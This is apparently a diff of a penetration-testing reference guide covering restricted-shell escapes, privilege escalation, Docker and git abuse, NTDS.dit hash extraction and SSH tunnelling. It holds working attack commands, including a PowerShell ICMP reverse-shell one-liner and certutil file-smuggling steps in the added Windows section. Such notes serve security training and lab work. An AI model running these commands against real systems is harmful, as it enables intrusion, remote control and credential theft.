@@ -1077,14 +1130,14 @@ Now, ssh to the box using that user.
 Restricted Shell
 ----------------
 
-Sometimes, after getting a shell, we figure out that we are in restricted shell. The below has been taken from `Escaping Restricted Linux Shells <https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells>`_ , `Escape from SHELLcatraz <https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells>`_ 
+Sometimes, after getting a shell, we figure out that we are in restricted shell. The below has been taken from `Escaping Restricted Linux Shells <https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells>`_, `Escape from SHELLcatraz <https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells>`_ 
 
 Definition
 ^^^^^^^^^^
 It limits a user's ability and only allows them to perform a subset of system commands. Typically, a combination of some or all of the following restrictions are imposed by a restricted shell:
 
 * Using the 'cd' command to change directories.
-* Setting or unsetting certain environment variables (i.e. SHELL, PATH, etc...).
+* Setting or un-setting certain environment variables (i.e. SHELL, PATH, etc...).
 * Specifying command names that contain slashes.
 * Specifying a filename containing a slash as an argument to the '.' built-in command.
 * Specifying a filename containing a slash as an argument to the '-p' option to the 'hash' built-in command.
@@ -1200,7 +1253,7 @@ SSHing from outside
 Getting out of rvim
 ^^^^^^^^^^^^^^^^^^^
 
-Main difference of rvim vs vim is that rvim does not allow escape to shell with previously described techincs and, on top of that, no shell commands at all. Taken from `vimjail <https://ctftime.org/writeup/5784>`_
+Main difference of rvim vs vim is that rvim does not allow escape to shell with previously described techniques and, on top of that, no shell commands at all. Taken from `vimjail <https://ctftime.org/writeup/5784>`_
 
 * To list all installed features it is possible to use ':version' vim command. 
 
@@ -1320,7 +1373,7 @@ Private SSH Keys / SSH Configuration
 
 .. _unprivileged-shell-to-privileged-shell:
 
-Unprivileged shell to privileged shell
+Unprivileged Shell to Privileged Shell
 ======================================
 
 Probably, at this point of time, we would have unprivileged shell of user www-data. If you are on Windows, there are particular set of steps. If you are on linux, it would be a good idea to first check privilege escalation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root permissions. 
@@ -1475,7 +1528,7 @@ Once, smbserver is up and running, we can execute code like
 Abusing Token Privileges
 ^^^^^^^^^^^^^^^^^^^^^^^^
 
-If we have the windows shell or meterpreter, we can type "whoami /priv" or if we have meterpreter, we can type "getpriv"
+If we have the windows shell or meterpreter, we can type "whoami /priv" or if we have meterpreter, we can type "getprivs"
 
 If we have any of the below privileges, we can possibly utilize `Rotten Potato <https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/>`_ 
 
@@ -1508,7 +1561,7 @@ Once, we have got the unprivileged shell, it is very important to check the belo
 * Are there any binaries with Sticky, suid, guid.
 * Are there any world-writable folders, files.
 * Are there any world-execuable files.
-* Which are the files owned by nobody ( No user )
+* Which are the files owned by nobody (No user)
 * Which are the files which are owned by a particular user but are not present in their home directory. (Mostly, the users have files and folders in /home directory. However, that's not always the case.)
 * What are the processes running on the machines? (ps aux). Remember, If something like knockd is running, we would come to know that Port Knocking is required.
 * What are the packages installed? (dpkg -l). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49).
@@ -1590,7 +1643,7 @@ After compromising the machine with an unprivileged shell, /home would contains 
 
 Execution of binary from Relative location than Absolute
 --------------------------------------------------------
-If we figure out that a suid binary is running with relative locations ( for example let's say backjob is running "id" and "scp /tmp/special ron@ton.home" )( figured out by running strings on the binary ). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.
+If we figure out that a suid binary is running with relative locations (for example let's say backjob is running "id" and "scp /tmp/special ron@ton.home")(figured out by running strings on the binary). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.
 
 so we can create a file in temp:
 
@@ -1611,7 +1664,12 @@ so we can create a file in temp:
   # /usr/bin/id
   uid=0(root) gid=0(root) groups=0(root),33(www-data)
 
-By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or "id" . So the chain of commands is: /opt/backjob switches user context to root (as it is suid) and tries to run “scp or id” -> Linux searches the filesystem according to its path (here: in /tmp first) -> Our malicious /tmp/scp or /tmp/id gets found and executed as root -> A new bash opens with root privileges.
+By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or "id" . So the chain of commands is: 
+
+* /opt/backjob switches user context to root (as it is suid) and tries to run “scp or id”
+* Linux searches the filesystem according to its path (here: in /tmp first)
+* Our malicious /tmp/scp or /tmp/id gets found and executed as root 
+* A new bash opens with root privileges.
 
 If we execute a binary without specifying an absolute paths, it goes in order of your $PATH variable. By default, it's something like:
 
@@ -1636,7 +1694,7 @@ Now, when we try to read example.conf file, we would be able to read the file fo
 ::
 
  readExampleConf /home/xxxxxxx/example.conf
- <Contents of shadow or id_rsa
+ <Contents of shadow or id_rsa>
 
 Directory Symlink
 ^^^^^^^^^^^^^^^^^
@@ -1667,7 +1725,7 @@ This might be useful to bypass some filtering, when let's say a cronjob is runni
 MySQL Privileged Escalation
 ---------------------------
 
-If mysql ( version 4.x, 5.x ) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize `User-Defined Function (UDF) Dynamic Library Exploit <http://www.0xdeadbeef.info/exploits/raptor_udf.c>`_ . A blog named `Gaining a root shell using mysql user defined functions and setuid binaries <https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/>`_  
+If mysql (version 4.x, 5.x) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize `User-Defined Function (UDF) Dynamic Library Exploit <http://www.0xdeadbeef.info/exploits/raptor_udf.c>`_ . A blog named `Gaining a root shell using mysql user defined functions and setuid binaries <https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/>`_  
 
 More Information
 ^^^^^^^^^^^^^^^^
@@ -1708,7 +1766,7 @@ or
  setgid(0); setuid(0);
  system("/bin/bash -p"); }
 
-However, if we have a unprivileged user, it is always better to check whether /bin/sh is the original binary or a symlink to /bin/bash or /bin/dash. If it's a symlink to bash,it won't provide us suid privileges, bash automatically drops its privileges when it's being run as suid (another security mechanism to prevent executing scripts as suid). So, it might be good idea to copy dash or sh to the remote system, suid it and use it.
+However, if we have a unprivileged user, it is always better to check whether /bin/sh is the original binary or a symlink to /bin/bash or /bin/dash. If it's a symlink to bash, it won't provide us suid privileges, bash automatically drops its privileges when it's being run as suid (another security mechanism to prevent executing scripts as suid). So, it might be good idea to copy dash or sh to the remote system, suid it and use it.
 
 More details can be found at `Common Pitfalls When Writing Exploits <http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html>`_
 
@@ -1758,7 +1816,7 @@ When the apt-update would be executed, it would be executed as root and we would
 SUDO -l Permissions
 -------------------
 
-Let's see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, find
+Let's see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, find and zip.
 
 nmap suid
 ^^^^^^^^^
@@ -2185,8 +2243,278 @@ Trick is that because of the '\*.c' wildcard, 'rsync' got '-e sh shell.c' option
 Tips and Tricks
 ===============
 
-FTP Services
-------------
+Windows
+-------
+
+Get-ChildItem Mode Values
+^^^^^^^^^^^^^^^^^^^^^^^^^
+
+'Mode' values returned by PowerShell's Get-ChildItem cmdlet?
+
+::
+
+ PS> gci|select mode,attributes -u
+
+ Mode                Attributes
+ ----                ----------
+ d-----               Directory
+ d-r---     ReadOnly, Directory
+ d----l Directory, ReparsePoint
+ -a----                 Archive
+
+In any case, the full list is:
+
+::
+
+ d - Directory
+ a - Archive
+ r - Read-only
+ h - Hidden
+ s - System
+ l - Reparse point, symlink, etc.
+
+Zip or unzip using ONLY Windows' built-in capabilities? 
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Powershell way
+
+::
+
+ Add-Type -A System.IO.Compression.FileSystem
+ [IO.Compression.ZipFile]::CreateFromDirectory('foo', 'foo.zip')
+ [IO.Compression.ZipFile]::ExtractToDirectory('foo.zip', 'bar')
+
+Alternate Data Stream
+^^^^^^^^^^^^^^^^^^^^^
+Sometimes, `Alternate Data Stream <https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/>`_ can be used to hide data in streams.
+
+The output shows not only the name of the ADS and its size, but also the unnamed data stream and its size is also listed (shown as :$DATA).
+
+Powershell-Way
+
+::
+
+ PS > Get-Item -Path C:\Users\Administrator\example.zip -stream *
+
+ Filename: C:\Users\Administrator\example.zip
+
+ Stream             Length
+ ------             -------
+ :$DATA             8
+ pass.txt           4
+
+Now, we know the name of the ADS, We can use the Get-Content cmdlet to query its contents.
+
+::
+
+ Get-Content -Path C:\Users\Administrator\example.zip -Stream pass.txt
+ The password is Passw0rd!
+
+Check a directory for ADS?
+
+::
+
+ gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'
+
+DIR Way
+
+Current directory ADS Streams
+
+::
+
+ dir /r | find ":$DATA"
+
+Sub-directories too
+
+::
+
+ dir   /s /r | find ":$DATA"
+
+Reading the hidden stream
+
+::
+
+ more < testfile.txt:hidden_stream::$DATA
+
+Redirecting Standard Out and Standard Error from PowerShell Start-Process
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Often reverse shells will not display standard error. Sometimes they will not display standard out when a new process is started. The following will redirect standard out and standard error to text files when PowerShell starts a new process.
+
+::
+
+ PS C:\> Start-Process -FilePath C:\users\administrator\foo.txt -NoNewWindow -PassThru -Wait -RedirectStandardOutput stdout.txt -RedirectStandardError stderr.txt
+
+`Powershell Start-Process Module Documentation <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process>`_.
+
+
+NTDS.dit and SYSTEM hive
+^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If you have found files such as 
+
+::
+
+ IP_psexec.ntdsgrab._333512.dit: Extensible storage engine DataBase, version 0x620, checksum 0x16d44752, page size 8192, DirtyShutdown, Windows version 6.1
+ IP_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above
+
+Probably, there are dump of domain controller NTDS.dit file, from which passwords can be extracted. Utilize,
+
+::
+
+ python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL
+
+ICMP Shell
+^^^^^^^^^^
+
+Sometimes, inbound and outbound traffic from any port is disallowed and only ICMP traffic is allowed. In that case, we can use `Simple reverse ICMP Shell <https://github.com/inquisb/icmpsh>`_ However, this requires the executable to be present on the system. There's a powershell version of `ICMP Reverse Shell <https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1>`_ Sometimes, probably, we can execute powershell code on the machine. In that case, we can use the one-liner powershell code to execute the shell.
+
+::
+
+ powershell -nop -c "$ip='your_ip'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment = $true; $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes('OK'), $po); while ($true) { $ry = $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(''), $po); if ($ry.Buffer) { $rs = ([text.encoding]::ASCII).GetString($ry.Buffer); $rt = (Invoke-Expression -Command $rs | Out-String ); $ic.Send($ip,60*1000,([text.encoding]::ASCII).GetBytes($rt),$po); } }"
+
+
+The above code is basically a reduced version of the powershell version of ICMP and have a limited buffer (which means commands whose output is greater than the buffer, won't be displayed!). Now, there's a painful way of transferring files to the victim system which is
+
+* Convert the file/ code which needs to be transferred in to base64. (If possible, remove all the unnecessary code/ comments, this would help us to reduce the length of the base64)
+* Utilize the `Add-Content cmdlet <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-5.1>`_ to transfer the file to the victim system. Do, remember to transfer the data in chunks as we have limited buffer! Probably, we have to run the below command twice or thrice to transfer the whole base64-encoded chunk.
+ 
+ ::
+  
+  Add-Content <filename> "Base64 encoded content"
+
+* Once the base64-encoded data is transferred, we can utilize `certutil <https://technet.microsoft.com/en-us/library/cc732443(v=ws.11).aspx>`_ from Microsoft to decode the base64-encoded to normal file.
+
+ ::
+
+  certutil <-decode/ -encode> <input file> <output file>
+  -decode Decode a Base64-encoded file
+  -encode Encode a file to Base64
+
+* Now, we can execute the file (assuming powershell ps1 file) to get the full powershell ICMP reverse shell with buffer management so, we would be able to get full output of the commands.
+
+* Now, most of the time after getting the intial shell, probably, we would have figured out user credentials ( let's say from www-data or iisapppool user to normal/ admin user credentials. ) At this point of time, we can use the below code to create a PSCredential.
+
+ ::
+
+  $username = 'UsernameHere';
+  $password = 'PasswordHere';
+  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword 
+
+* Once, we have created a PSCredential, we can use `Invoke-Command <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command>`_  to execute command as that user.
+
+  ::
+   
+   Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {Command to be executed}
+   -ComputerName localhost is required as the code is to be executed on localhost, without -ComputerName, InvokeCommand doesn't work.
+
+* Possibly, we can execute the ICMP Shell code to get the shell as the new user.
+
+* One problem, which we gonna face is, when we are running ICMP Shell with different users for example, first with IISWebpool, then with User1, then with user2, we would get multple times IISWebpool as that powershell process (on UDP) is still running. One way to this is Just before launching a new ICMP shell as a different user. 
+  
+  * Check powershell processes with Show-Process
+
+   ::
+
+    Show-Process -Name *power* "
+  
+  *  Note down  the PID 
+  * Execute shell as the different user 
+  * Stop-Process the previous PID
+
+Recovering password from System.Security.SecureString
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If we have windows credentials stored as System.Security.SecureString, we can use
+
+::
+
+ $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
+ $UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+
+or 
+
+::
+
+ $UnsecurePassword = (New-Object PSCredential "user",$SecurePassword).GetNetworkCredential().Password
+
+Example:
+
+::
+
+ PS> $PlainPassword = Read-Host -AsSecureString  "Enter password"
+ PS> Enter password: ***
+ PS> $PlainPassword
+ PS> System.Security.SecureString
+ PS> $UnsecurePassword1 = (New-Object PSCredential "user",$PlainPassword).GetNetworkCredential().Password
+ PS> $UnsecurePassword1
+ PS> yum
+
+Copy To or From a PowerShell Session
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+This is a awesome feature to copy files from different computers on which we have a WinRM or Remote PS Session. Directly taken from `Copy To or From a PowerShell Session <https://blogs.technet.microsoft.com/poshchap/2015/10/30/copy-to-or-from-a-powershell-session/>`_
+
+* Copy Local files to a remote session :
+ 
+ ::
+
+  ##Initialize the session
+  $TargetSession = New-PSSession -ComputerName HALOMEM03
+
+  ##  Copy Files from Local session to remote session
+  Copy-Item -ToSession $TargetSession -Path "C:\Users\Administrator\desktop\scripts\" -Destination "C:\Users\administrator.HALO\desktop\" -Recurse
+
+* Copy some files from a remote session to the local server:
+
+  ::
+
+   ## Create the session
+   $SourceSession = New-PSSession -ComputerName HALODC01
+
+   ## Copy from Remote machine to Local machine
+   Copy-Item -FromSession $SourceSession -Path "C:\Users\Administrator\desktop\scripts\" -Destination "C:\Users\administrator\desktop\" -Recurse
+
+Get-Hash
+^^^^^^^^
+
+`Get-FileHash <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash>`_ Computes the hash value for a file by using a specified hash algorithm.
+
+::
+
+ PS > Get-FileHash Hello.rst                                                                                                                                                        
+
+ Algorithm       Hash                                                                   Path                                                                                                                                                                            
+ ---------       ----                                                                   ----                                                                                                                                                                            
+ SHA256          8A7D37867537DB78A74A473792928F14EDCB3948B9EB11A48D6DE38B3DD30EEC       /tmp/Hello.rst                                                                                   
+
+Active Directory Enumeration and Remote Code Execution
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Probably, refer  :doc:`LFF-IPS-P3-Exploitation`
+
+It contains
+
+* Active Directory Reconnaissance : Information about active directory enumeration with Domain User rights by various methods such as rpclient, enum4linux, nltest, netdom, powerview, bloodhound, adexplorer, Jexplorer, Remote Server Administration Tools, Microsoft Active Directory Topology Diagrammer, reconnaissance using powershell, powershell adsisearcher etc.
+* Remote Code Execution Methods : Information about multiple ways to get a execute remote commands on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, scheduled tasks, service controller (sc), remote registry, WinRM, WMI, DCOM, Mimikatz Pass the hash/ Pass the ticket, remote desktop etc.
+
+Others
+^^^^^^
+
+* Invoking Net Use using Credentials to mount remote system
+
+ The below example executes command on file.bitvijays.local computer with Domain Administrator credentials and utilizes net use to mount Domain Controller C Drive and read a particular file
+ ::
+
+   Invoke-Command -ComputerName file.bitvijays.local -Credential $credential -ScriptBlock {net use x: \\dc.bitvijays.local\C$ /user:bitvijays.local\domainadministrator_user DA_Passw0rd!; type x:\users\administrator\desktop\imp.txt}
+
+
+Wget
+----
+
+FTP via Wget
+^^^^^^^^^^^^
 
 If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)
 
@@ -2202,6 +2530,25 @@ wgetrc Commands
  output_document = file -- Set the output filename—the same as ‘-O file’.
  post_data = string -- Use POST as the method for all HTTP requests and send string in the request body. The same as ‘--post-data=string’.
  post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.
+ -P prefix
+ --directory-prefix=prefix
+   Set directory prefix to prefix.  The directory prefix is the directory where all other files and subdirectories will be saved to, i.e. the top of the retrieval tree.  The default is . (the current directory).
+
+Tricks
+^^^^^^
+
+* The interesting part with -P Parameter is you can save the file in /tmp if your current directory is /. Let me explain, Let's say, your current directory is /home/user/ if we do
+
+ ::
+
+  wget IPAddress -P tmp
+
+ it would create a tmp folder in the /home/user/ and save the file in that. However, if you current directory is /, it would save the file in /tmp folder, from where you can execute stuff.
+
+* wget accepts IP address in decimal format 
+
+
+
 
 SSH
 ---
@@ -2220,6 +2567,64 @@ If you know the password of the user, however, ssh is not allowing you to login,
    Match user example_user1 
    PasswordAuthentication yes 	
    ## End tighten security
+
+SSH Tunneling
+-------------
+
+SSH protocol, which supports bi-directional communication channels can create encrypted tunnels.
+
+Local Port Forwarding
+^^^^^^^^^^^^^^^^^^^^^
+
+SSH local port forwarding allows us to tunnel a local port to a remote server, using SSH as the transport protocol.
+
+::
+
+ ssh sshserver -L <local port to listen>:<remote host>:<remote port>
+
+Example: 
+
+Imagine we’re on a private network which doesn’t allow connections to a specific server. Let’s say you’re at work and youtube is being blocked. To get around this we can create a tunnel through a server which isn’t on our network and thus can access Youtube.
+
+::
+
+ $ ssh -L 9000:imgur.com:80 user@example.com
+
+The key here is -L which says we’re doing local port forwarding. Then it says we’re forwarding our local port 9000 to youtube.com:80, which is the default port for HTTP. Now open your browser and go to http://localhost:9000
+
+Remote Port Forwarding
+^^^^^^^^^^^^^^^^^^^^^^
+
+SSH remote port forwarding allows us to tunnel a remote port to a local server.
+
+::
+
+ ssh sshserver -R <remote port to bind>:<local host>:<local port>
+
+Example:
+
+Let's say there's a wordpress web-application we have compromised and have a www-data shell. Also, let's say, we are inside a docker environment with the network below
+
+::
+
+ 172.16.0.1 Host-Machine
+ 172.16.0.2 WordPress
+ 172.16.0.3 Joomla
+ 172.16.0.4 Mysql
+
+Now, Let's say, we have root credentials of mysql and want to access it using dbeaver application. Now, as we have access of wordpress machine, we can basically ssh to our machine (Let's say our IP is 10.10.15.111), creating a Remote Port Forward
+
+::
+
+ ssh bitvijays@10.10.15.111 -R 3306:172.16.0.4:3306
+
+The above would create a ssh tunnel between 10.10.15.111:3306 and 172.16.0.4:3306. Then, we would be able to just launch dbeaver and connect to localhost mysql and browse the database at 172.16.0.4:3306.
+
+As we would be probably inside the docker and www-data user, we might not have ssh binary and proper environment variable in that case, we can add below options
+
+::
+
+ ./ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i id_rsa -R 3306:172.16.0.4:3306 -fN bitvijays@10.10.15.111
 
 SSH as SOCKS Proxy
 ^^^^^^^^^^^^^^^^^^
@@ -2370,32 +2775,6 @@ PHP
 
 * PHP's preg_replace() function which can lead to RCE. It's deprecated in later revisions (PHP >= 5.5.0). If you think there's a pattern which is replaced in a text, refer `The unexpected dangers of preg_replace() <https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace>`_ 
 
-run-parts
----------
-
-run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.
-
-:: 
-
-  run-parts /etc/cron.daily
-
-Sudoers file
-------------
-
-If the sudoers file contains: 
-	
-secure_path
-^^^^^^^^^^^
-Path used for every command run from sudo. If you don't trust the people running sudo to have a sane PATH environment variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt_group option are not affected by secure_path. This option is not set by default.
-
-env_reset
-^^^^^^^^^
-If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the caller's environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The contents of the env_keep and env_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.
-
-mail_badpass
-^^^^^^^^^^^^
-Send mail to the mailto user if the user running sudo does not enter the correct password. If the command the user is attempting to run is not permitted by sudoers and one of the mail_all_cmnds, mail_always, mail_no_host, mail_no_perms or mail_no_user flags are set, this flag will have no effect. This flag is off by default.
-
 Docker Security
 ---------------
 
@@ -2464,105 +2843,6 @@ Become root?
   docker run -v /:/stuff -t my-docker-image /bin/sh -c 'cp /stuff/bin/bash /stuff/bin/root-shell-ftw && chmod a+s /stuff/bin/root-shell-ftw'
   root-shell-ftw  -p
   root-shell-ftw-4.3#
- 
-
-Java keystore file
-------------------
-
-Refer `Java Keytool essentials working with java keystores <https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores>`_ and `openssl essentials working with ssl certificates private keys and csrs <https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats>`_
-
-Cracking MD5 Hashes
--------------------
-
-Try `Crackstation <https://crackstation.net/>`_ or `ISC Reverse hash <https://isc.sans.edu/tools/reversehash.html>`_
-
-Steghide
---------
-Looking for hidden text in the images? Utilize steghide
-
-::
-
-  steghide version 0.5.1
-
-  the first argument must be one of the following:
-  embed, --embed          embed data
-  extract, --extract      extract data
-  info, --info            display information about a cover- or stego-file
-  info <filename>       display information about <filename>
-  encinfo, --encinfo      display a list of supported encryption algorithms
-  version, --version      display version information
-  license, --license      display steghide's license
-  help, --help            display this usage information
-
-.. Tip :: Sometimes, there is no password, so just press enter.
-
-Git client Privilege Escalation
---------------------------------
-Git clients (before versions 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1) and Mercurial clients (before version 3.2.3) contained three vulnerabilities that allowed malicious Git or Mercurial repositories to execute arbitrary code on vulnerable clients under certain circumstances. Refer `12 Days of HaXmas: Exploiting CVE-2014-9390 in Git and Mercurial <https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial>`_
-
-In one of write-up, `Nicolas Surribas <http://devloop.users.sourceforge.net/>`_ has mentioned about two git environment variables GIT_SSH and GIT_TEMPLATE which can be utilized to do privilege escalation if git clone is performed using a suid binary. Imagine a suid binary utilized to do git clone from a remote directory.
-
-GIT_SSH
-^^^^^^^
-
-If either (GIT_SSH or GIT_SSH_COMMAND) of these environment variables is set then git fetch and git push will use the specified command instead of ssh when they need to connect to a remote system. The command will be given exactly two or four arguments: the username@host (or just host) from the URL and the shell command to execute on that remote system, optionally preceded by -p (literally) and the port from the URL when it specifies something other than the default SSH port. $GIT_SSH_COMMAND takes precedence over $GIT_SSH, and is interpreted by the shell, which allows additional arguments to be included.  $GIT_SSH on the other hand must be just the path to a program (which can be a wrapper shell script, if additional arguments are needed).
-
-::
-
-  echo '#!/bin/bash' > cmd
-  echo 'cp /root/flag.txt /tmp' >> cmd
-  echo 'chmod 777 /tmp/flag.txt' >> cmd
-  GIT_SSH=/home/username/cmd ./setuidbinary(utilizing git clone/ git fetch)
-
-  or
-
-  echo 'chown root:root /home/username/priv ; chmod 4755 /home/username/priv' > ssh
-
-  where priv is binary compiled from suid.c
-
-This basically changes the command from
-
-::
-
-  trace: built-in: git 'clone' 'ssh://root@machine-dev:/root/secret-project' '/mnt/secret-project/'
-
-to
-
-::
-
-  trace: run_command: '/home/user/ssh' 'root@machine-dev' 'git-upload-pack '\''/root/secret-project'\'''
-
-GIT_TEMPLATE_DIR
-^^^^^^^^^^^^^^^^^
-Files and directories in the template directory whose name do not start with a dot will be copied to the $GIT_DIR after it is created. Refer `Git-init <https://git-scm.com/docs/git-init>`_ 
-
-::
-
-  cp -r /usr/share/git-core/templates/ mytemplates
-  cd mytemplates/hooks
-  echo '#!/bin/bash' > post-checkout
-  echo 'cp /root/flag /tmp/flag2' >> post-checkout
-  echo 'chown username.username /tmp/flag2' >> post-checkout
-  chmod +x post-checkout
-  cd ../..
-  GIT_TEMPLATE_DIR=/home/username/mytemplates/ ./setuidbinary( utilizing git clone/ git fetch)
-
-
-Metasploit shell upgrade
-------------------------
-
-In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in a VM), we can upgrade it to meterpreter by using sessions -u
-
-:: 
-
-   sessions -h
-   Usage: sessions [options]
-   
-   Active session manipulation and interaction.
-
-   OPTIONS:
-
-   -u <opt>  Upgrade a shell to a meterpreter session on many platforms
 
 Password Protected File
 ------------------------
@@ -2727,6 +3007,184 @@ If you see, something like this
 it's probably `SECCURE Elliptic Curve Crypto Utility for Reliable Encryption <http://point-at-infinity.org/seccure/>`_ Utilize python module `seccure <https://pypi.python.org/pypi/seccure>`_ to get the plaintext. 
 
 
+Network Information
+-------------------
+
+
+Sometimes, ifconfig and netstat are not present on the system. If so, check if ip and ss are installed?
+
+ip
+^^
+
+::
+
+  ip addr
+    
+   1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+   17: wwan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
+      link/ether b2:06:fe:2b:73:c6 brd ff:ff:ff:ff:ff:ff
+     inet 14.97.194.148/30 brd 14.97.194.151 scope global dynamic noprefixroute wwan0
+       valid_lft 5222sec preferred_lft 5222sec
+
+hostname
+^^^^^^^^
+
+We can also check the ipaddress of the host using hostname command
+
+::
+
+ hostname -I
+ 172.17.0.1 14.97.194.148 
+
+ss
+^^
+
+ss - another utility to investigate sockets
+
+::
+
+ ss
+ 
+       -n, --numeric
+              Do not try to resolve service names.
+     -l, --listening
+              Display only listening sockets (these are omitted by default).
+       -t, --tcp
+              Display TCP sockets.
+
+       -u, --udp
+              Display UDP sockets.
+
+
+Sudoers file
+------------
+
+If the sudoers file contains: 
+	
+secure_path
+^^^^^^^^^^^
+Path used for every command run from sudo. If you don't trust the people running sudo to have a sane PATH environment variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt_group option are not affected by secure_path. This option is not set by default.
+
+env_reset
+^^^^^^^^^
+If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the caller's environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The contents of the env_keep and env_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.
+
+mail_badpass
+^^^^^^^^^^^^
+Send mail to the mailto user if the user running sudo does not enter the correct password. If the command the user is attempting to run is not permitted by sudoers and one of the mail_all_cmnds, mail_always, mail_no_host, mail_no_perms or mail_no_user flags are set, this flag will have no effect. This flag is off by default.
+
+run-parts
+---------
+
+run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.
+
+:: 
+
+  run-parts /etc/cron.daily
+
+Java keystore file
+------------------
+
+Refer `Java Keytool essentials working with java keystores <https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores>`_ and `openssl essentials working with ssl certificates private keys and csrs <https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats>`_
+
+Cracking MD5 Hashes
+-------------------
+
+Try `Crackstation <https://crackstation.net/>`_ or `ISC Reverse hash <https://isc.sans.edu/tools/reversehash.html>`_
+
+Steghide
+--------
+Looking for hidden text in the images? Utilize steghide
+
+::
